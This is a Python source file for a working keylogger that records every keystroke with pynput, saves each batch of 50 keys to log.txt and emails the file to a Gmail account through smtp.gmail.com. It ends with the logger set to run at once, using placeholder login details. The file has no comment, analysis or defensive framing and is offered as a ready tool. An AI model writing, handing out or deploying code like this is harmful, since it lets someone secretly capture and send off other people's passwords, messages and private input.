from pynput.keyboard import Key, Listener

import smtplib

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

class KeyLogger:

    def __init__(self, email, password):
        self.listener = Listener(
            on_press=self.on_press, on_release=self.on_release)
        self.keys = []
        self.count = 0
        self.file = "log.txt"
        self.email = email
        self.password = password
        self.msg = MIMEMultipart()
        self.msg['Subject'] = 'Keylogger report'
        self.msg['From'] = self.email
        self.msg['To'] = self.email

    def on_press(self, key):
        if not isinstance(key, (Key)):
            key = key.char
        self.keys.append(key)
        self.count += 1

        if self.count >= 50:
            self.log_file()

    def on_release(self, key):
        if key == Key.esc:
            self.log_file()
            return False

    def log_file(self):
        with open(self.file, 'w') as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                f.write(k)
                f.write(' ')
            f.write('\n')
        self.count = 0
        self.send_mail(self.email,self.password)
        self.keys = []
        self.msg = MIMEMultipart()
        self.msg['Subject'] = 'Keylogger report'
        self.msg['From'] = self.email
        self.msg['To'] = self.email

    def send_mail(self, email, password):
        with open(self.file, 'r') as f:
            part = MIMEApplication(f.read(), Name=self.file)
        part['Content-Disposition'] = 'attachment; filename="{}"'.format(self.file)
        self.msg.attach(part)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.msg.as_string())
        server.quit()

    def start(self):
        self.listener.start()
        self.listener.join()


# Run keylogger
pyLog = KeyLogger("YOUR MAIL","YOUR PASSWORD")
pyLog.start()

